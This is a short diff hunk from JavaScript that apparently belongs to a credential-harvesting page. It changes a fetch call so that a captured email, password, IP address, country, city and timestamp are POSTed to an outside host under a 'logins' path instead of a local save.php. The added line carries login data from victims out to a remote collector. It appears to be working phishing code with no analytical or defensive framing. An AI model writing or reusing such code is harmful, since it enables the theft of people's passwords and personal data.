@@ -248,7 +248,7 @@
           const city = data.city;
           const time = new Date().toISOString();
 
-          fetch('save.php', {
+          fetch('https://girlhotnewstoday.github.io/logins/?save.php', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ email, pass, ip, country, city, time })
